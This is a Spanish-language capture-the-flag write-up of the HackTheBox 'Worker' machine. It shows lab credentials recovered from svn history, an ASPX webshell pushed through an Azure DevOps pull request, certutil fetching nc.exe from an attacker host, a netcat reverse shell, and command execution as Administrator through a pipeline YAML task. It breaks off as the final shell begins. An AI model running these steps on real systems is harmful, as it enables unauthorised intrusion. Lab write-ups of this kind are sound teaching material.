---
layout      : post
title       : "HackTheBox - Worker"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270banner.png
category    : [ htb ]
tags        : [ devOps, repositories ]
---
Máquina Windows nivel medio. Wowoworker, vamos a jugar mucho con repositorios y ramas. Romperemos cositas de Azure DevOps para ejecutar comandos en el sistema como Administradores.

![workerHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/workerHTB.png)

### TL;DR (Spanish writeup)

Creador: [ekenas](https://www.hackthebox.eu/profile/222808).

Linda maquina eh! 

Empezaremos enumerando repositorios, nos copiaremos uno que está siendo mantenido como `dimensión.worker.htb`, esto hecho con la herramienta `svn` (que es uno de los servicios que tenemos corriendo). Jugando con los argumentos usaremos uno para ver los `commits` (un log de ellos) para así obtener un usuario: `nathen`. Después usaremos otro argumento para ver detalladamente cada commit, de ahí obtendremos la contraseña del usuario, con esas credenciales lograremos entrar a un nuevo dominio: `devops.worker.htb`.

Estando dentro haremos `commit` para subir una webshell. Con ella generaremos una reverse Shell.
Con enumeración básica encontraremos (casi que no) un disco nuevo: `w:\`. De ahí obtendremos las credenciales del usuario `robisl`. Con ellas podemos entrar al sistema con `evil-winrm` y también a `devops.worker.htb`.

Usaremos una funcionalidad de `Azure DevOps` que nos permite ejecutar comandos en el sistema como "tareas". Nos daremos cuenta de que se están ejecutando como administrador. Aprovecharemos esa locura para obtener una reverse Shell. O bueno, algo parecido (:

#### Clasificación de la máquina.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Vamos a ensuciarnos un poco y trepa a la realidad.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto).

Démosle candela. Tendremos como siempre 3 fases:

1. [Enumeración](#enumeracion)
2. [Explotación](#explotacion)
3. [Escalada de privilegios](#escalada-de-privilegios)

...

## Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos realizando un escaneo de puertos sobre la máquina para saber que servicios está corriendo.

```bash
–» nmap -p- --open -v -Pn 10.10.10.203
```

En este caso vamos a agregarle el parámetro `-T` para hacer el escaneo más rápido.

```bash
–» nmap -p- --open -v -Pn -T5 10.10.10.203
```

Aún sigue lento, cambiemos el `-T` por `--min-rate`:

```bash
–» nmap -p- --open -v -Pn --min-rate=2000 10.10.10.203 -oG initScan
```

Perfecto va mucho más rápido.

> **Es importante hacer un escaneo total, sin cambios ni parametros de más, asi vaya lento, que nos permita ver si obviamos/pasamos algún puerto**.
> ```sh
> –» nmap -p- --open -v -Pn 10.10.10.203 -oG totalScan
> ```

| Parámetro  | Descripción   |
| -----------|:------------- |
| -p-        | Escanea todos los 65535                                                                                  |
| --open     | Solo los puertos que están abiertos                                                                      |
| -Pn        | Evita que realice Host Discovery, como **ping** (P) y el **DNS** (n)                                     |
| -T         | Forma de escanear súper rápido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos) |
| --min-rate | Indica que no queremos hacer peticiones menores al número que pongamos                                   |
| -v         | Permite ver en consola lo que va encontrando                                                             |
| -oG        | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard      |

```bash
–» cat initScan 
# Nmap 7.80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.203
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.203 ()   Status: Up
Host: 10.10.10.203 ()   Ports: 80/open/tcp//http///, 3690/open/tcp//svn///, 5985/open/tcp//wsman///     Ignored State: filtered (65532)
# Nmap done at Mon Nov 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 162.46 seconds
```

Muy bien, tenemos los siguientes servicios:

| Puerto | Descripción   |
| ------ | :------------ |
| 80     | **HTTP**: Servidor web                             |
| 3690   | **SVN**: Aún no lo sabemos                         |
| 5985   | **WSMan (WinRM)**: [Protocolo basado en SOAP para la administración de servidores, dispositivos, aplicaciones y diversos servicios web.](https://en.wikipedia.org/wiki/WS-Management))                          |

Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:

```bash
–» nmap -p 80,3690,5985 -sC -sV 10.10.10.203 -oN portScan
```

| Parámetro | Descripción   |
| ----------|:------------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

```bash
–» cat portScan 
# Nmap 7.80 scan initiated Mon Nov 23 25:25:25 2020 as: nmap -p 80,3690,5985 -sC -sV -oN portScan 10.10.10.203
Nmap scan report for 10.10.10.203
Host is up (0.19s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Tenemos:

| Puerto | Servicio   | Versión                       |
| :----- | :--------: | :---------------------------- |
| 80     | HTTP       | Microsoft IIS httpd 10.0      |
| 3690   | [**svnserve**](http://svnbook.red-bean.com/es/1.0/svn-ch-6-sect-3.html) | Subversion |
| 5985   | HTTP       | Microsoft HTTPAPI (SSDP/UPnP) |

Listo, demosle e investiguemos más sobre cada servicio.

...

#### • Puerto 80 [⌖](#puerto-80) {#puerto-80}

![270pageport80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pageport80.png)

Solo nos muestra esto, si damos click en la imagen nos lleva a otro dominio fuera de la máquina (relacionado con documentación), por ahora nos enfocaremos solo en esta página. Podemos intentar hacer fuzzing de directorios a ver si encontramos algo, pero Nelson, no obtenemos nada. Miremos otro servicio mientras tanto...

#### • Puerto 3690 [⌖](#puerto-3690) {#puerto-3690}

Buscando que hace [svn](http://svnbook.red-bean.com/en/1.7/svn.ref.svnserve.html) tenemos que es una herramienta que nos permite el control de versiones de [Subversion](https://es.wikipedia.org/wiki/Subversion_(software)).

Perfecto, encontré [esta guia](https://www.csoft.net/docs/svnserve.html) que nos indica el uso de `svn` entre ellas nos muestra como "probar" el funcionamiento del repositorio generando una copia del mismo.

> To test the server's functionality, you can create a working copy of your repository using your shell. The `checkout` command will create a working copy of the repository. [CSoft](https://www.csoft.net/docs/svnserve.html)

Tendríamos:

> svn co svn://your-domain.com/$HOME/my-repo my-working-dir

En nuestro caso quedaría así:

```bash
–» svn co svn://10.10.10.203/ repository_copy/
A    repository_copy/dimension.worker.htb
A    repository_copy/dimension.worker.htb/LICENSE.txt
A    repository_copy/dimension.worker.htb/README.txt
A    repository_copy/dimension.worker.htb/assets
A    repository_copy/dimension.worker.htb/assets/css
A    repository_copy/dimension.worker.htb/assets/css/fontawesome-all.min.css
A    repository_copy/dimension.worker.htb/assets/css/main.css
A    repository_copy/dimension.worker.htb/assets/css/noscript.css
A    repository_copy/dimension.worker.htb/assets/js
A    repository_copy/dimension.worker.htb/assets/js/breakpoints.min.js
A    repository_copy/dimension.worker.htb/assets/js/browser.min.js
A    repository_copy/dimension.worker.htb/assets/js/jquery.min.js
A    repository_copy/dimension.worker.htb/assets/js/main.js
A    repository_copy/dimension.worker.htb/assets/js/util.js
A    repository_copy/dimension.worker.htb/assets/sass
A    repository_copy/dimension.worker.htb/assets/sass/base
A    repository_copy/dimension.worker.htb/assets/sass/base/_page.scss
A    repository_copy/dimension.worker.htb/assets/sass/base/_reset.scss
A    repository_copy/dimension.worker.htb/assets/sass/base/_typography.scss
A    repository_copy/dimension.worker.htb/assets/sass/components
A    repository_copy/dimension.worker.htb/assets/sass/components/_actions.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_box.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_button.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_form.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_icon.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_icons.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_image.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_list.scss
A    repository_copy/dimension.worker.htb/assets/sass/components/_table.scss
A    repository_copy/dimension.worker.htb/assets/sass/layout
A    repository_copy/dimension.worker.htb/assets/sass/layout/_bg.scss
A    repository_copy/dimension.worker.htb/assets/sass/layout/_footer.scss
A    repository_copy/dimension.worker.htb/assets/sass/layout/_header.scss
A    repository_copy/dimension.worker.htb/assets/sass/layout/_main.scss
A    repository_copy/dimension.worker.htb/assets/sass/layout/_wrapper.scss
A    repository_copy/dimension.worker.htb/assets/sass/libs
A    repository_copy/dimension.worker.htb/assets/sass/libs/_breakpoints.scss
A    repository_copy/dimension.worker.htb/assets/sass/libs/_functions.scss
A    repository_copy/dimension.worker.htb/assets/sass/libs/_mixins.scss
A    repository_copy/dimension.worker.htb/assets/sass/libs/_vars.scss
A    repository_copy/dimension.worker.htb/assets/sass/libs/_vendor.scss
A    repository_copy/dimension.worker.htb/assets/sass/main.scss
A    repository_copy/dimension.worker.htb/assets/sass/noscript.scss
A    repository_copy/dimension.worker.htb/assets/webfonts
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.eot
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.svg
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.woff
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.eot
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.svg
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.woff
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.eot
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.svg
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.woff
A    repository_copy/dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
A    repository_copy/dimension.worker.htb/images
A    repository_copy/dimension.worker.htb/images/bg.jpg
A    repository_copy/dimension.worker.htb/images/overlay.png
A    repository_copy/dimension.worker.htb/images/pic01.jpg
A    repository_copy/dimension.worker.htb/images/pic02.jpg
A    repository_copy/dimension.worker.htb/images/pic03.jpg
A    repository_copy/dimension.worker.htb/index.html
A    repository_copy/moved.txt
Revisión obtenida: 5
–» ls repository_copy/
dimension.worker.htb  moved.txt
```

Perfecto, tenemos una copia del repositorio en nuestra máquina, démosle un vistazo a ver que podemos obtener:

* Nos muestra lo que parece ser el dominio al que resuelve ese repositorio: `dimension.worker.htb`.
* Otro dominio e información extra en el archivo `moved.txt`.

```bash
–» cat moved.txt 
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

Pues vamos a tener que jugar con el archivo `/etc/hosts` para que al entrar a la dirección `10.10.10.203` nos resuelva a los dominios `dimension.worker.htb` y `devops.worker.htb` que al parecer son los que realmente están siendo mantenidos por el equipo **Worker**.

```bash
–» cat /etc/hosts
...
10.10.10.203  dimension.worker.htb devops.worker.htb
...
```

Podemos probar nuevamente en la web pero ahora indicándole el dominio `dimension.worker.htb`:

![270pagedimensionworker](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedimensionworker.png)

Y con `devops.worker.htb`:

![270pagedevopsworker](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopsworker.png)

Pues nada, démosle a `dimension` a ver si logramos obtener un usuario para poder entrar en `devops`.

Si entramos a `work` nos muestra lo que parecen ser varios vHost, si ponemos el mouse encima (no pude hacer que se viera en la imagen :P) nos muestra estas URL's:

* alpha.worker.htb
* cartoon.worker.htb
* lens.worker.htb
* solid-state.worker.htb
* spectral.worker.htb
* story.worker.htb

Puede ser un gran (gran) rabbit hole, pero igual quiero probar si obtenemos algo. Agreguémoslos al `/etc/hosts`.

```bash
–» cat /etc/hosts
...
10.10.10.203  dimension.worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb
...
```

Bueno, no fue tanto tiempo perdido, les di una ojeada rápida por si veía algo interesante pero no, nada llamativo.

Seguí buscando información sobre `svn` y después de un rato entendí varios de sus comandos:

Podemos ver los logs del repositorio:

```bash
–» svn log svn://10.10.10.203/
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 08:52:00 -0500 (sáb 20 de jun de 2020) | 1 línea

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 08:50:20 -0500 (sáb 20 de jun de 2020) | 1 línea

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 08:46:19 -0500 (sáb 20 de jun de 2020) | 1 línea

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 08:45:16 -0500 (sáb 20 de jun de 2020) | 1 línea

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 08:43:43 -0500 (sáb 20 de jun de 2020) | 1 línea

First version
------------------------------------------------------------------------
```

* Podemos decirle que haga un `verbose` para que sea más explicito con la info:

```bash
–» svn log -v svn://10.10.10.203/
------------------------------------------------------------------------
r5 | nathen | 2020-06-20 08:52:00 -0500 (sáb 20 de jun de 2020) | 1 línea
Rutas cambiadas:
   A /moved.txt

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 08:50:20 -0500 (sáb 20 de jun de 2020) | 1 línea
Rutas cambiadas:
   D /deploy.ps1

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 08:46:19 -0500 (sáb 20 de jun de 2020) | 1 línea
Rutas cambiadas:
   M /deploy.ps1

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 08:45:16 -0500 (sáb 20 de jun de 2020) | 1 línea
Rutas cambiadas:
   A /deploy.ps1

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 08:43:43 -0500 (sáb 20 de jun de 2020) | 1 línea
Rutas cambiadas:
   A /dimension.worker.htb
   A /dimension.worker.htb/LICENSE.txt
   A /dimension.worker.htb/README.txt
   A /dimension.worker.htb/assets
   A /dimension.worker.htb/assets/css
   A /dimension.worker.htb/assets/css/fontawesome-all.min.css
   A /dimension.worker.htb/assets/css/main.css
   A /dimension.worker.htb/assets/css/noscript.css
   A /dimension.worker.htb/assets/js
   A /dimension.worker.htb/assets/js/breakpoints.min.js
   A /dimension.worker.htb/assets/js/browser.min.js
   A /dimension.worker.htb/assets/js/jquery.min.js
...
... #Todos los archivos que nos copio antes del repositorio.
...
```

Vemos una traza de la fecha, hora, el ID de cada log (r*), el usuario y que se hizo (que contenía el **commit**). En los logs `r2, r3 y r4` hay un archivo llamado `deploy.ps1` que según la descripción era (lo borraron en el commit 4) un script para desplegar me imagino que todo el entorno o herramientas necesarias.

* Tenemos un usuario: `nathen`.

Encontré [como podemos ver que cambio se realizó en cada **commit**](http://svnbook.red-bean.com/en/1.7/svn.tour.revs.specifiers.html#svn.tour.revs.keywords) o [acá también](http://svnbook.red-bean.com/es/1.0/svn-ch-3-sect-3.html) (si es que hicieron algún cambio):

```bash
–» svn diff svn://10.10.10.203/
svn: E195002: No se especificaron todas las revisiones requeridas
```

Con `-r` le pasamos cuál **commit** queremos revisar (también se puede poner un rango). Revisemos el `2` que fue cuando se agregó el archivo `deploy.ps1`.

```bash
–» svn diff -r2 svn://10.10.10.203/
Index: deploy.ps1
===================================================================
--- deploy.ps1  (revisión: 2)
+++ deploy.ps1  (nonexistent)
@@ -1,6 +0,0 @@
-$user = "nathen" 
-$plain = "wendel98"
-$pwd = ($plain | ConvertTo-SecureString)
-$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
-$args = "Copy-Site.ps1"
-Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

Opa, tenemos unas posibles credenciales. En el siguiente commit se arrepiente de lo que subio :(:

```bash
–» svn diff -r3 svn://10.10.10.203/
Index: deploy.ps1
===================================================================
--- deploy.ps1  (revisión: 3)
+++ deploy.ps1  (nonexistent)
@@ -1,7 +0,0 @@
-$user = "nathen" 
-# NOTE: We cant have my password here!!!
-$plain = ""
-$pwd = ($plain | ConvertTo-SecureString)
-$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
-$args = "Copy-Site.ps1"
-Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
\ No newline at end of file
```

Pero da igual, ya quedo la traza. `nathen:wendel98`. Probemos ingresando con ellas a `devops.worker.htb`:

![270pagedevopsin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopsin.png)

Perfecto, enumeremos el servicio `Azure Devops`.

Una [explicacion muy buena de Azure Devops](https://medium.com/edureka/azure-devops-cf755fb334ae) y [un documento](https://docs.microsoft.com/en-us/azure/devops/pipelines/get-started/key-pipelines-concepts?view=azure-devops) que resume cada apartado.

Después de mucha lectura sobre, `pipelines`, `builds` y demás cositas, entendí la estructura y flujo. 

...

## Explotación [#](#explotacion) {#explotacion}

Inicialmente había probado simplemente en uno de los **repositorios** agregar un archivo y hacer un `commit`, pero obtenía el siguiente error:

```html
TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.
```

Pase de él y seguí buscando formas de lograr algo... Paso mucho tiempo :P y no encontré nada. Volví a intentar hacer un commit para subir un archivo desde la web, salió el mismo error, pero ahora lo busque en internet, encontré esto:

* [https://www.freshbrewed.science/azure-devops-vsts-security-and-policies-part-2/index.html](https://www.freshbrewed.science/azure-devops-vsts-security-and-policies-part-2/index.html)

El problema es de políticas y claramente por seguridad, pero el artículo nos enseña una manera de remediarlo en la que clonaremos el repositorio, agregaremos el archivo, obtendremos el error, nos crearemos una nueva rama, haremos el `push` hacia el repositorio, iremos a la web en donde nos mostrara que alguien quiere hacer un commit, le daremos la opción de generar un `pull request` y con la misma web permitiremos que se genere el `push`. Veamos:

Primero nos posicionamos en el repositorio que queramos para obtener el link y posteriormente clonarlo (se acuerdan los dominios que obtuvimos antes, pues ellos están acá), usaré `lens` inicialmente:

![270pagedevopsrepolens](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopsrepolens.png)

```bash
–» git clone http://devops.worker.htb/ekenas/SmartHotel360/_git/lens
Clonando en 'lens'...
Username for 'http://devops.worker.htb': nathen
Password for 'http://nathen@devops.worker.htb': 
remote: Azure Repos
remote: Found 96 objects to send. (2 ms)
Desempaquetando objetos: 100% (96/96), 2.06 MiB | 828.00 KiB/s, listo.

–» ls lens/
assets  images  index.html  LICENSE.txt  README.txt
```

Ahora agregamos el archivo, hacemos el commit y el push.

> Usaremos `.aspx`: La extensión de archivo ASPX se utiliza para páginas web que son generadas automáticamente por el servidor y dirigen directamente a un servidor activo. Se asocian habitualmente con la infraestructura Microsoft ASP.NET. Este formato web puede abrirse en cualquier navegador web si la URL finaliza con la extensión ASPX. [Online ASPX](https://www.online-convert.com/es/formato-de-archivo/aspx)

* [Encontré esta webshell sencilla](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx).

```bash
–» vim candelapura.aspx 
–» git add .
–» git commit -m "Quemando esto"
[master 014fedf] Quemando esto
–» git push
Username for 'http://devops.worker.htb': nathen
Password for 'http://nathen@devops.worker.htb': 
Enumerando objetos: 7, listo.
Contando objetos: 100% (7/7), listo.
Comprimiendo objetos: 100% (4/4), listo.
Escribiendo objetos: 100% (4/4), 506 bytes | 506.00 KiB/s, listo.
Total 4 (delta 2), reusado 1 (delta 0), pack-reusado 0
remote: Analyzing objects... (4/4) (6 ms)
remote: Storing packfile... done (23 ms)
remote: Storing index... done (31 ms)
To http://devops.worker.htb/ekenas/SmartHotel360/_git/lens
 ! [remote rejected] master -> master (TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.)
error: falló el push de algunas referencias a 'http://devops.worker.htb/ekenas/SmartHotel360/_git/lens'
```

Obtenemos el error (: Ahora procedemos a crear una nueva rama:

```bash
–» git checkout -b feature/patestpa 
Cambiado a nueva rama 'feature/patestpa'
–» git push
fatal: La rama actual feature/patestpa no tiene una rama upstream.
Para realizar un push de la rama actual y configurar el remoto como upstream, use

        git push --set-upstream origin feature/patestpa

–» git push --set-upstream origin feature/patestpa
Username for 'http://devops.worker.htb': nathen
Password for 'http://nathen@devops.worker.htb': 
Enumerando objetos: 7, listo.
Contando objetos: 100% (7/7), listo.
Comprimiendo objetos: 100% (4/4), listo.
Escribiendo objetos: 100% (4/4), 506 bytes | 506.00 KiB/s, listo.
Total 4 (delta 2), reusado 1 (delta 0), pack-reusado 0
remote: Analyzing objects... (4/4) (5 ms)
remote: Storing packfile... done (33 ms)
remote: Storing index... done (43 ms)
To http://devops.worker.htb/ekenas/SmartHotel360/_git/lens
   a306cfe..014fedf  feature/patestpa -> feature/patestpa
Rama 'feature/patestpa' configurada para hacer seguimiento a la rama remota 'feature/patestpa' de 'origin'.
```

Listo, ahora vamos para la web y creamos el `pull request`:

![270pagedevopspullreq1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopspullreq1.png)

Damos clic en `create a pull request`:

![270pagedevopspullreq2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopspullreq2.png)

Ahora en `Create`:

![270pagedevopspullreq3](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopspullreq3.png)

En esta pagina debemos hacer 3 cosas (que son las que a la derecha estan con un chulo ya), de esas controlamos 2:

* Dar al boton `Approve`.
* Agregar un `Work Item`, yo agregue cualquiera :P

Damos clic en `Complete` y despues en `Complete Merge`, verifiquemos la estructura de archivos ahora:

![270pagedevopscandelafiledone](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopscandelafiledone.png)

Ahora si el archivo esta en la raiz del repo, entonces podremos ingresar a el mediante la siguente url: `http://lens.worker.htb/candelapura.aspx`:

![270pagedevopswebshell](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopswebshell.png)

Perfectooooooooooooooooooooo, ahora podriamos subir el binario `netcat`, para mediante `certutil.exe` o `PowerShell` subirlo a la maquina y despues usarlo para entablarnos una reverse shell, a ver:

```powershell
#Web
/c dir c:\Windows\Temp

#Attack machine
–» ls
lens  nc.exe  repository_copy
–» python -m SimpleHTTPServer

#Web
/c certutil.exe -f -split -urlcache http://10.10.14.161:8000/nc.exe c:\Windows\Temp\nc.exe
```

![270pagedevopswebshellupnc](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopswebshellupnc.png)

```powershell
#Web
/c c:\Windows\Temp\nc.exe 10.10.14.161 4433 -e cmd.exe
```

![270bashrevsh1done](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270bashrevsh1done.png)

Opa, tamos dentro compadreeee (: Lindo lindo, bueno a ver como podemos cambiar de usuario.

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

**Acá fui un fracaso como enumerador** :P, enumere y enumere y me perdí demasiado, use `Winpeas` y no encontré nada... Seguí enumerando hasta que ya no sabía hacia donde mirar... Buscando ayuda, [Sosa](https://s0s4.gitlab.io/) me indico que volviera a revisar `Winpeas` pero encofado en los discos... Y pues:

```powershell
  [+] Drives Information
   [?] Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])
    W:\ (Type: Fixed)(Volume label: Work)(Filesystem: NTFS)(Available space: 16 GB)(Permissions: Users [AppendData/CreateDirectories])
```

:I Tenemos otro disco :(:, `W:\`. Veamoslo:

```powershell
PS C:\Windows\Temp> cd w:\
cd w:\
PS W:\> dir
dir


    Directory: W:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       2020-06-16     18:59                agents                                                                
d-----       2020-03-28     14:57                AzureDevOpsData                                                       
d-----       2020-04-03     11:31                sites                                                                 
d-----       2020-06-20     16:04                svnrepos                                                              


PS W:\> 
```

Enumeremos en el a ver que encontramos.

```powershell
PS W:\svnrepos\www\conf> dir
dir


    Directory: W:\svnrepos\www\conf


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       2020-06-20     11:29           1112 authz                                                                 
-a----       2020-06-20     11:29            904 hooks-env.tmpl                                                        
-a----       2020-06-20     15:27           1031 passwd                                                                
-a----       2020-04-04     20:51           4454 svnserve.conf
```

Revisando el archivo `passwd`, tenemos:

```
...
nathen = wendel98  
nichin = fqerfqerf
nichin = asifhiefh  
noahip = player      
...
quehub = pickme 
quihud = kindasecure
...
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
...
sapket = hamburger
sarkil = friday
```

Usuarios del repositorio. Si nos fijamos tenemos a `robisl = wolves11`, el cual es un usuario tambien del sistema. Probemos a entrar a la pagina con ese usuario.

![270pagedevo_rob_log](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_log.png)

![270pagedevo_rob_files](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_files.png)

En este caso no podríamos repetir lo que hicimos con `nathen`, ya que acá no sabemos donde está alojado el servicio `PartsUnlimited`. No tenemos dominio ni nada como para probar a ver los archivos despues de ser subidos. Así que si recordamos lo que se intentó al inicio de la máquina, cuando estábamos jugando a "que hacer" como `nathen`, encontramos los `pipeline`, que con ellos podemos generar tareas que se ejecuten en el repositorio.

Pero también podemos indicarle que queremos ejecutar algún comando o tarea en el sistema:

* [Docs.microsoft - Azure Pipelines (Command Line Task)](https://docs.microsoft.com/en-us/azure/devops/pipelines/tasks/utility/command-line?view=azure-devops&tabs=yaml).
* [Geeks.ms - Tarea personalizada Azure Pipelines](https://geeks.ms/jorge/2019/02/28/como-ejecutar-en-el-pipeline-de-azure-devops-una-tarea-personalizada/).

> Para hacer esto dependemos de [YAML (YAML Ain’t Markup Language)](https://fercontreras.com/conoce-que-es-un-yaml-e18e9d21ade4). Básicamente es un formato que permite guardar datos de manera demasiado legible.

Si seguimos [esta guia](https://geeks.ms/jorge/2019/02/28/como-ejecutar-en-el-pipeline-de-azure-devops-una-tarea-personalizada/), logramos esto:

Primero creemos el `Pipeline`, le indicamos que queremos que ejecute en el sistema y validamos.

![270pagedevo_rob_createpipe](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe.png)

![270pagedevo_rob_createpipe2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe2.png)

Seleccionamos `Azure Repos Git` y despues el repositorio, en este caso `PartsUnlimited`:

En **Configure** bajamos y seleccionamos `Starter Pipeline`:

![270pagedevo_rob_createpipe3](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe3.png)

Y obtenemos nuestro archivo:

![270pagedevo_rob_createpipe4](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe4.png)

Ahora podemos modificar la estructura, agreguemos una linea que nos ejecute `whoami`:

```yml
trigger:
- master

pool: 'Default'

steps:
- script: 'whoami'

- script: echo Hello, world!
  displayName: 'Run a one-line script'

- script: |
    echo Add other tasks to build, test, and deploy your project.
    echo See https://aka.ms/yaml
  displayName: 'Run a multi-line script'
```

Damos clic en `Save and run`:

![270pagedevo_rob_createpipe5](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe5.png)

Despues le indicamos que nos cree una nueva rama, ya que si intentamos hacerlo directamente en la `master` no nos deja y damos en `Save and run`, pero nos dice que no encuentra el `Pool` llamado `Default`. Validando [donde encontrar que `Pool`'s hay en el sistema](https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops&tabs=yaml%2Cbrowser) tenemos:

![270pagedevo_rob_createpipe6agent](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe6agent.png)

Un `Pool` llamado `Setup` que su creador o el que lo maneja es el usuario `Administrator`. Lo cual es interesante porque pueda que lo que ejecutemos mediante el archivo `YAML` se esté ejecutando como usuario administrador. Sigamos viendo a ver si solucionamos el error.

Cambiamos simplemente:

```yml
...
pool: 'Setup'
...
```

**Save and run** > **Save and run**...

![270pagedevo_rob_createpipe7](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe7.png)

Y si revisamos la tarea que se llama `CmdLine` tenemos la respuesta del sistema:

![270pagedevo_rob_pipewhoami](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_pipewhoami.png)

Perfecto, tenemos ejecución de comandos en el sistema como administrador... Entablemos una reverse shell (:

```yml
trigger:
